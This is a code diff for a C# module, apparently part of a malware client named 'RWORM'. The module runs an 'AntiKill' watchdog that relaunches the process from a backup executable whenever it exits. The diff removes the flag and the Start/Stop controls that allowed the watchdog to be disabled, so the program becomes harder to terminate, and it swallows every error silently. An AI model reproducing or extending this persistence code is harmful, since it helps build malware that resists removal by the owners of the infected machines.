@@ -11,14 +11,11 @@ namespace RWORM.Client.Modules
     {
         private static Process? _watchdogProcess;
         private static volatile bool _isShuttingDown = false;
-        private static volatile bool _watchdogDisabled = false;
         private static readonly string FlagPath = Path.Combine(Path.GetTempPath(), "sess_exit.flag");
-
-        public static bool IsActive => !_watchdogDisabled && _watchdogProcess != null && !_watchdogProcess.HasExited;
 
         public static void InitializeWatchdog()
         {
-            if (!Config.AntiKill || _watchdogDisabled) return;
+            if (!Config.AntiKill) return;
 
             try
             {
@@ -80,7 +77,7 @@ namespace RWORM.Client.Modules
 
         private static void StartWatchdogInstance(string currentExe, string backupExe)
         {
-            if (_isShuttingDown || _watchdogDisabled) return;
+            if (_isShuttingDown) return;
 
             try
             {
@@ -99,7 +96,7 @@ namespace RWORM.Client.Modules
                     _watchdogProcess.EnableRaisingEvents = true;
                     _watchdogProcess.Exited += (s, e) =>
                     {
-                        if (!_isShuttingDown && !_watchdogDisabled)
+                        if (!_isShuttingDown)
                         {
                             Thread.Sleep(1000);
                             StartWatchdogInstance(currentExe, backupExe);
@@ -110,9 +107,8 @@ namespace RWORM.Client.Modules
             catch { }
         }
 
-        public static void StopWatchdog()
+        public static void PrepareCleanExit()
         {
-            _watchdogDisabled = true;
             _isShuttingDown = true;
             try
             {
@@ -128,21 +124,6 @@ namespace RWORM.Client.Modules
                 }
             }
             catch { }
-            _watchdogProcess = null;
-        }
-
-        public static void StartWatchdog()
-        {
-            _watchdogDisabled = false;
-            _isShuttingDown = false;
-            Config.AntiKill = true;
-            try { if (File.Exists(FlagPath)) File.Delete(FlagPath); } catch { }
-            InitializeWatchdog();
-        }
-
-        public static void PrepareCleanExit()
-        {
-            StopWatchdog();
         }
 
         /// <summary>
